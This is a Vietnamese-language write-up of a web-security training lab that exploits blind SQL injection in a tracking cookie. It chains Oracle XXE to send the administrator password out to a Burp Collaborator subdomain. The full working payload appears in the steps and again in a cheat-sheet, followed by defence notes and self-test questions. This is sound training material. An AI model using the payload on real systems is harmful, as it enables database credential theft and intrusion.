# Lab 16 — Blind SQL Injection with Out-of-band Data Exfiltration

## Mục tiêu
Khai thác lỗ hổng SQLi mù trong cookie `TrackingId`, khi ứng dụng **không hề tồn tại side-channel in-band nào** (không content diff, không status diff, không time diff vì query chạy async) — buộc phải dùng kỹ thuật **Out-of-band (OOB)**: kết hợp SQLi + XXE để ép Oracle tự gọi DNS/HTTP request ra Burp Collaborator, nhúng thẳng password vào subdomain của request đó để đọc trực tiếp.

---

## 1. Bản chất lỗ hổng

**Root cause:** Giống mọi lab SQLi khác — cookie `TrackingId` bị nối chuỗi trực tiếp vào câu SQL backend, không qua parameterized query.

**Điểm khác biệt cốt lõi so với Lab 11/12/14/18 — vì sao buộc phải dùng OOB:**

Đề bài nêu rõ: *"The SQL query is executed asynchronously and has no effect on the application's response."*

| Lab | Tín hiệu dùng để suy luận | Có dùng được ở lab này không? |
|---|---|---|
| Lab 11 (Conditional responses) | Nội dung response khác nhau | ❌ Response luôn giống hệt nhau |
| Lab 12 (Conditional errors) | HTTP status khác nhau (200/500) | ❌ Query lỗi hay không cũng không ảnh hưởng response |
| Lab 18 (Visible error-based) | Nội dung error message chứa data | ❌ Không suppress hay không, error cũng không hiện ra |
| Lab 14 (Time delays) | Thời gian phản hồi khác nhau | ❌ Query chạy **async** → dù `pg_sleep`/tương đương chạy bao lâu, response vẫn trả về ngay, không blocking |
| **Lab 16 (OOB exfiltration)** | **DNS/HTTP request DB tự gọi ra ngoài** | ✅ Kênh duy nhất còn khả dụng |

→ Đây là tình huống **mọi in-band channel đều bị vô hiệu hóa hoàn toàn**, nên phải tạo ra 1 kênh tín hiệu **hoàn toàn tách biệt** khỏi cặp request/response HTTP giữa attacker và server lab.

**DBMS:** Oracle (dùng `EXTRACTVALUE`, `xmltype`, `FROM dual` — đặc thù Oracle đã quen thuộc từ Lab 10, 12).

---

## 2. Vì sao phải kết hợp XXE — Oracle không có network function đơn giản

Không giống MSSQL (`xp_dirtree`, `xp_fileexist` có thể trigger UNC path lookup trực tiếp), Oracle **không có sẵn 1 hàm SQL đơn giản để tự gọi ra URL ngoài**.

→ Phải khai thác gián tiếp qua cơ chế **XXE (XML External Entity)**, lồng bên trong hàm xử lý XML của Oracle:

- `EXTRACTVALUE(xmltype('<xml>...</xml>'), '/path')` — hàm Oracle trích xuất giá trị từ 1 node XML
- Bản thân hàm này chỉ là "vỏ bọc" — mục đích thật sự không phải lấy giá trị XML, mà là **ép Oracle phải parse đoạn XML đầu vào**
- Trong đoạn XML đó, nhúng 1 **external DTD entity**:
  ```xml
  <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ATTACKER_URL/"> %remote; ]>
  ```
- Khi Oracle's XML parser gặp `SYSTEM "http://..."`, nó sẽ **tự động đi fetch URL đó** (đúng hành vi XXE kinh điển — External Entity được resolve tại thời điểm parse)
- `%remote;` ở cuối là bước **ép DTD parser thực thi ngay** việc fetch entity vừa khai báo (nếu thiếu dòng này, entity chỉ được khai báo mà không được "gọi", sẽ không có request nào xảy ra)

→ Kết quả: **Oracle server tự làm HTTP/DNS client**, gọi ra Collaborator đúng lúc xử lý câu query — hoàn toàn nằm ngoài tầm kiểm soát của response HTTP trả về cho attacker.

---

## 3. Kỹ thuật exfiltrate dữ liệu — nhúng password vào subdomain

Chỉ tạo được request ra ngoài (XXE cơ bản) mới chỉ chứng minh injectable, chưa lấy được data. Điểm mấu chốt để **đọc được password** là dùng phép nối chuỗi Oracle (`||`) để chèn kết quả subquery **ngay vào trong URL bị gọi ra**:

```sql
"http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR_SUBDOMAIN/"
```

- `||` — toán tử concatenation của Oracle (giống Postgres, khác `CONCAT()` MySQL, khác `+` MSSQL)
- Chuỗi URL thật được Oracle build ra lúc runtime sẽ là:
  ```
  http://<password_thật>.xxxxxxxxx.oastify.com/
  ```
- Khi Collaborator server nhận DNS lookup hoặc HTTP request tới domain này, **subdomain chính là dữ liệu bạn cần đọc** — không cần dò từng ký tự như Boolean-based/Conditional errors, **1 request lấy được nguyên chuỗi giá trị** (giống tốc độ của Visible error-based ở Lab 18, nhưng qua kênh OOB thay vì error message).

---

## 4. Quy trình khai thác đầy đủ (từng bước đã thực hiện)

### Bước 0 — Xác nhận injection point
Bắt request có cookie `TrackingId` → gửi sang Repeater, tắt Intercept. (Không kỳ vọng thấy phản hồi khác biệt gì — vì đây là lỗ hổng thuần OOB, mọi test in-band đều vô nghĩa ở lab này.)

### Bước 1 — Mở tab Collaborator
Vào **Burp menu → Collaborator tab** (yêu cầu Burp Suite Professional — Collaborator client không có ở bản Community).

### Bước 2 — Gõ payload với placeholder cho subdomain (chưa insert vội)

Gõ vào giá trị cookie `TrackingId` (dạng plain text, chưa encode):

```sql
x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR_PAYLOAD/"> %remote;]>'),'/l') FROM dual--
```

**Vì sao gõ placeholder `COLLABORATOR_PAYLOAD` trước, không insert Collaborator payload ngay từ đầu:**
Nếu bôi đen sai vùng (VD bôi luôn cả URL `http://...`) rồi mới Insert Collaborator payload, Burp sẽ **thay thế toàn bộ vùng bôi đen** bằng subdomain — xóa mất đoạn `'||(SELECT password...)||'` quan trọng. Gõ placeholder trước giúp kiểm soát chính xác vị trí cần thay.

### Bước 3 — Bôi đen CHÍNH XÁC chữ `COLLABORATOR_PAYLOAD` → Insert Collaborator payload

1. Double-click hoặc kéo chuột chọn **đúng** chuỗi `COLLABORATOR_PAYLOAD` (không kèm dấu `.` hay `/` xung quanh)
2. Chuột phải → **Insert Collaborator payload**
3. Burp tự sinh 1 subdomain unique (VD `lqfm8h4q417hkrzptux92bidsuj0ao4ct.oastify.com`) và đăng ký nó vào phiên polling hiện tại

**Kiểm tra ngay sau khi insert:** Phải còn nguyên cấu trúc:
```
...||'.lqfm8h4q417hkrzptux92bidsuj0ao4ct.oastify.com/">...
```
Nếu phần `'||(SELECT password...)||'` biến mất → đã bôi đen sai vùng, làm lại từ Bước 2.

### Bước 4 — Encode và Send

1. Bôi đen **toàn bộ** giá trị cookie vừa sửa → **Ctrl+U đúng 1 lần** (tránh double-encode)
2. **Send**
3. Response trả về **bình thường, không có gì đặc biệt** — đúng như kỳ vọng (query async, không ảnh hưởng response)

### Bước 5 — Poll Collaborator và đọc kết quả

1. Qua tab **Collaborator → Poll now** (đợi vài giây, poll lại nếu chưa thấy — query async cần thời gian xử lý)
2. Tìm dòng **HTTP interaction** ứng đúng với subdomain vừa insert (khớp theo cột **Payload**)
3. Click vào dòng đó → tab **"Request to Collaborator"** → xem dòng `Host:`

**Kết quả thực tế đã thu được:**
```
Host: djzdcr64qajpi4dwbflu.lqfm8h4q417hkrzptux92bidsuj0ao4ct.oastify.com
```

→ Cấu trúc domain: `<password>.<collaborator-subdomain>.oastify.com` — phần trước dấu chấm đầu tiên chính là password:
```
djzdcr64qajpi4dwbflu
```

### Bước 6 — Đăng nhập

1. Vào **My account**
2. Username: `administrator`
3. Password: `djzdcr64qajpi4dwbflu` (giá trị leak được — sẽ khác nhau mỗi lần lab được khởi tạo lại)
4. Login → lab chuyển "Not solved" → "Solved"

---

## 5. Lỗi thực tế đã gặp và cách sửa (bài học quan trọng)

| Lỗi gặp phải | Nguyên nhân | Cách sửa |
|---|---|---|
| Interaction xuất hiện (DNS + HTTP) nhưng Host header chỉ có subdomain trơn, không có password | Bôi đen **toàn bộ URL** (`http://.../`) rồi mới Insert Collaborator payload → Burp thay thế đè lên, xóa mất đoạn `'\|\|(SELECT password FROM users WHERE username='administrator')\|\|'` | Gõ payload với placeholder text (VD `COLLABORATOR_PAYLOAD`) trước, chỉ bôi đen đúng placeholder đó rồi mới Insert Collaborator payload — giữ nguyên phần subquery nối chuỗi xung quanh |
| Nhầm tưởng "chỉ cần copy subdomain cũ dán vào chỗ cần sửa" | Hiểu sai Insert Collaborator payload là thao tác dán text đơn thuần | Insert Collaborator payload không chỉ chèn text — nó còn **đăng ký** subdomain vào phiên polling hiện tại; tái sử dụng subdomain cũ bằng cách gõ tay vẫn hoạt động nhưng làm mất khả năng phân biệt rõ interaction ứng với lần thử nào — nên luôn dùng thao tác Insert cho mỗi lần sửa payload quan trọng |

---

## 6. So sánh nhanh: OOB exfiltration (Lab 16) vs 4 kỹ thuật blind/error trước

| Đặc điểm | Lab 11 | Lab 12 | Lab 18 | Lab 14 | **Lab 16 (OOB)** |
|---|---|---|---|---|---|
| Tín hiệu | Content diff | Status diff | Error chứa data | Time diff | **DNS/HTTP request ra Collaborator** |
| Điều kiện bắt buộc | Response phân biệt theo số dòng | Không suppress lỗi | Verbose error + DB leak giá trị | Không có side-channel nào khác | **Không có bất kỳ in-band channel nào** (kể cả time, vì query async) |
| Tốc độ extract | 1 bit/request | 1 bit/request | Nguyên 1 giá trị/request | 1 bit/request | **Nguyên 1 giá trị/request** |
| Yêu cầu công cụ | Burp bất kỳ | Burp bất kỳ | Burp bất kỳ | Burp bất kỳ (Intruder) | **Bắt buộc Burp Suite Professional** (Collaborator) |
| Kỹ thuật lồng ghép | Không | Không | Không | Stacked query | **XXE lồng trong SQLi** (2 lớp lỗ hổng kết hợp) |
| DBMS function đặc thù | — | `CASE WHEN` | `CAST()` | `pg_sleep()` (Postgres) | `EXTRACTVALUE()` + `xmltype()` (Oracle) |

---

## 7. Phòng chống

- **Gốc rễ:** Parameterized query / prepared statement — driver tách kênh code và data ở tầng giao thức, input không bao giờ được parser SQL đọc như cú pháp.
- **Chặn OOB cụ thể:**
  - Vô hiệu hóa resolve external entity trong XML parser (`disable-external-entities`, hoặc dùng flag an toàn tương đương của DB engine) — chặn được vector XXE cụ thể này, nhưng **không vá được injection point gốc**.
  - Kiểm soát network egress của DB server (firewall rule chặn DB server tự mở outbound connection ra internet) — hạn chế thiệt hại của kỹ thuật OOB nói chung, không chỉ riêng SQLi+XXE.
- **Least privilege DB account:** hạn chế quyền gọi các package/function nguy hiểm (VD `UTL_HTTP`, XML processing packages) nếu ứng dụng không thực sự cần dùng.
- **Lưu ý quan trọng:** Suppress error hay disable time delay đều **không giúp gì** ở đây — vì bản chất bug đã né tránh hoàn toàn mọi in-band channel ngay từ đầu (do thiết kế async). Đây là minh chứng rõ nhất cho nguyên tắc: **chỉ có parameterization mới triệt tiêu injection point tận gốc**, mọi biện pháp khác chỉ chặn từng kênh lộ dữ liệu cụ thể.

---

## 8. Câu hỏi tự kiểm tra

1. Vì sao time-based blind SQLi (`pg_sleep`, `dbms_pipe.receive_message`...) — vốn được xem là kỹ thuật "cuối cùng" ở Lab 14 khi mọi in-band channel khác đều hết — **vẫn không dùng được** ở lab này? Sự khác biệt nằm ở đâu trong cách server xử lý query (đồng bộ vs bất đồng bộ)?
2. Vì sao phải "mượn" cơ chế XXE để tạo network call, thay vì Oracle có sẵn 1 hàm SQL đơn giản để tự gọi HTTP như MSSQL?
3. Vai trò của `UNION SELECT ... FROM dual` trong payload này là gì, nếu bạn biết chắc kết quả UNION sẽ **không bao giờ hiển thị** ra response? (Gợi ý: mục đích không phải để đọc data qua UNION, mà để làm gì?)
4. Vì sao toán tử `||` (concatenation) lại là mấu chốt biến 1 XXE "trigger được request ra ngoài" thành 1 kênh "exfiltrate được dữ liệu thật" — nếu thiếu `||(SELECT password...)||` thì payload còn chứng minh được gì, và mất đi khả năng gì?
5. Vì sao việc bôi đen sai vùng trước khi Insert Collaborator payload (bôi cả URL thay vì chỉ bôi placeholder) lại xóa mất đúng phần quan trọng nhất của payload — điều này nói lên gì về việc cần hiểu rõ **từng phần payload đang làm gì** trước khi dùng tool tự động hỗ trợ, thay vì chỉ tin tưởng tool xử lý đúng ý mình?

---

## 9. Payload cuối cùng (cheat-sheet)

```sql
-- Cấu trúc payload đầy đủ (dạng plain text, trước khi encode)
x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

**Checklist trước khi Send:**
- [ ] Còn nguyên `'||(SELECT password FROM users WHERE username='administrator')||'` ngay trước subdomain
- [ ] Subdomain là subdomain **mới nhất** vừa Insert Collaborator payload (không tự gõ tay subdomain cũ)
- [ ] Đã Ctrl+U đúng 1 lần (kiểm tra tab Raw, không double-encode)
- [ ] Còn `FROM dual--` ở cuối (cú pháp Oracle bắt buộc)

**Đọc kết quả:** Tab Collaborator → Poll now → HTTP interaction → Request to Collaborator → dòng `Host:` → phần trước dấu chấm đầu tiên = password.

**Yêu cầu môi trường:** Bắt buộc Burp Suite Professional (Collaborator client). Academy platform chặn tương tác ra domain ngoài tùy ý — chỉ Burp Collaborator's default public server mới hoạt động được với lab này.
